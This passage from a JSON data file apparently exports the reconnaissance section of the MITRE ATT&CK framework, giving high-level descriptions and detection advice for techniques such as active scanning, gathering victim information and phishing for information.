{
  "TA0043": {
    "name": "Reconnaissance",
    "description": "\nThe adversary is trying to gather information they can use to plan future operations. Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.\n",
    "technique": {
      "T1595": {
        "name": "Active Scanning",
        "description": " \nBefore compromising a victim, adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction. \nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.  \n \nInformation from these scans may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services or  Exploit Public-Facing Application ).  ",
        "detection": "\nMonitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1595.001": {
        "name": "Scanning IP Blocks",
        "description": " \nBefore compromising a victim, adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. \nAdversaries may scan IP blocks in order to  Gather Victim Network Information , such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.  \nInformation from these scans may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services ).  ",
        "detection": "\nMonitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet).Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1595.002": {
        "name": "Vulnerability Scanning",
        "description": " \nBefore compromising a victim, adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use. \nThese scans may also include more broad attempts to  Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.  \nInformation from these scans may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  Exploit Public-Facing Application ).  ",
        "detection": "\nMonitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1592": {
        "name": "Gather Victim Host Information",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.). \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning or  Phishing for Information . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.  \nInformation about hosts may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  Supply Chain Compromise or  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1592.001": {
        "name": "Hardware",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.). \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning (ex: hostnames, server banners, user agent strings) or  Phishing for Information . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.  \nInformation about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  Compromise Hardware Supply Chain or  Hardware Additions ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1592.002": {
        "name": "Software",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.). \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning (ex: listening ports, server banners, user agent strings) or  Phishing for Information . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.  \nInformation about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or for initial access (ex:  Supply Chain Compromise or  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1592.003": {
        "name": "Firmware",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.). \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).  \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  Supply Chain Compromise or  Exploit Public-Facing Application ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1592.004": {
        "name": "Client Configurations",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone. \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning (ex: listening ports, server banners, user agent strings) or  Phishing for Information . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.  \nInformation about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  Supply Chain Compromise or  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1589": {
        "name": "Gather Victim Identity Information",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials. \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about victims may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ).  \n \n \n \n \n \n \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Phishing for Information ), establishing operational resources (ex:  Compromise Accounts ), and/or initial access (ex:  Phishing or  Valid Accounts ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1589.001": {
        "name": "Credentials",
        "description": " \nBefore compromising a victim, adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts. \nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via  Phishing for Information . Adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors.  \nCredential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex:  Search Engines , breach dumps, code repositories, etc.).  \n \n \n \n \n \n \nAdversaries may also purchase credentials from dark web or other black-markets. Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Phishing for Information ), establishing operational resources (ex:  Compromise Accounts ), and/or initial access (ex:  External Remote Services or  Valid Accounts ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1589.002": {
        "name": "Email Addresses",
        "description": " \nBefore compromising a victim, adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees. \nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ).  \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Phishing for Information ), establishing operational resources (ex:  Email Accounts ), and/or initial access (ex:  Phishing ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1589.003": {
        "name": "Employee Names",
        "description": " \nBefore compromising a victim, adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures. \nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ).  \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains or  Phishing for Information ), establishing operational resources (ex:  Compromise Accounts ), and/or initial access (ex:  Phishing or  Valid Accounts ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1590": {
        "name": "Gather Victim Network Information",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations. \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning or  Phishing for Information . Information about networks may also be exposed to adversaries via online or other accessible data sets (ex:  Search Open Technical Databases ).  \n \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1590.001": {
        "name": "Domain Properties",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers. \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning or  Phishing for Information . Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex:  WHOIS ).  \n \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Technical Databases ,  Search Open Websites/Domains , or  Phishing for Information ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  Phishing ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1590.002": {
        "name": "DNS",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. \nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via  DNS/Passive DNS . DNS information may also be exposed to adversaries via online or other accessible data sets (ex:  Search Open Technical Databases ).  \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Technical Databases ,  Search Open Websites/Domains , or  Active Scanning ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1590.003": {
        "name": "Network Trust Dependencies",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex:  Search Open Technical Databases ).  \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1590.004": {
        "name": "Network Topology",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure. \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning or  Phishing for Information . Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex:  Search Victim-Owned Websites ).  \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Technical Databases or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1590.005": {
        "name": "IP Addresses",
        "description": " \nBefore compromising a victim, adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted. \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning or  Phishing for Information . Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex:  Search Open Technical Databases ).  \n \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1590.006": {
        "name": "Network Security Appliances",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations. \nAdversaries may gather this information in various ways, such as direct collection actions via  Active Scanning or  Phishing for Information .  \nInformation about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex:  Search Victim-Owned Websites ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Technical Databases or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1591": {
        "name": "Gather Victim Org Information",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees. \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ).  \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  Phishing or  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1591.001": {
        "name": "Determine Physical Locations",
        "description": " \nBefore compromising a victim, adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within. \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex:  Search Victim-Owned Websites or  Social Media ).  \n \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  Phishing or  Hardware Additions ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1591.002": {
        "name": "Business Relationships",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources. \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ).  \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  Supply Chain Compromise ,  Drive-by Compromise , or  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1591.003": {
        "name": "Identify Business Tempo",
        "description": " \nBefore compromising a victim, adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources. \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ).  \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  Supply Chain Compromise or  Trusted Relationship )  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1591.004": {
        "name": "Identify Roles",
        "description": " \nBefore compromising a victim, adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to. \nAdversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media or  Search Victim-Owned Websites ).  \nGathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  Phishing ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1598": {
        "name": "Phishing for Information",
        "description": " \nBefore compromising a victim, adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from  Phishing in that the objective is gathering data from the victim rather than executing malicious code. \nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns. \nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.  \n \n \n \n \nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  Establish Accounts or  Compromise Accounts ) and/or sending multiple, seemingly urgent messages.  ",
        "detection": "\nDepending on the specific method of spearphishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. Also consider enabling DMARC to verify the sender of emails. When it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).\n\n"
      },
      "T1598.001": {
        "name": "Spearphishing Service",
        "description": " \nBefore compromising a victim, adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  Establish Accounts or  Compromise Accounts ) and/or sending multiple, seemingly urgent messages. \nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.  \nThese services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex:  Social Media or  Search Victim-Owned Websites ) to craft persuasive and believable lures.  ",
        "detection": "\nMonitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1598.002": {
        "name": "Spearphishing Attachment",
        "description": " \nBefore compromising a victim, adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  Establish Accounts or  Compromise Accounts ) and/or sending multiple, seemingly urgent messages. \nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.  \n \nThe text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex:  Search Open Websites/Domains or  Search Victim-Owned Websites ) to craft persuasive and believable lures.  ",
        "detection": "\nMonitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. Also consider enabling DMARC to verify the sender of emails.\n\n"
      },
      "T1598.003": {
        "name": "Spearphishing Link",
        "description": " \nBefore compromising a victim, adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  Establish Accounts or  Compromise Accounts ) and/or sending multiple, seemingly urgent messages. \nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.  \n \nThe given website may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Adversaries may also use information from previous reconnaissance efforts (ex:  Search Open Websites/Domains or  Search Victim-Owned Websites ) to craft persuasive and believable lures.  ",
        "detection": "\nMonitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. Also consider enabling DMARC to verify the sender of emails. Monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.\n\n"
      },
      "T1597": {
        "name": "Search Closed Sources",
        "description": " \nBefore compromising a victim, adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.  \nAdversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.  \n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services or  Valid Accounts ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1597.001": {
        "name": "Threat Intel Vendors",
        "description": " \nBefore compromising a victim, adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.  \n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex:  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  Exploit Public-Facing Application or  External Remote Services ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1597.002": {
        "name": "Purchase Technical Data",
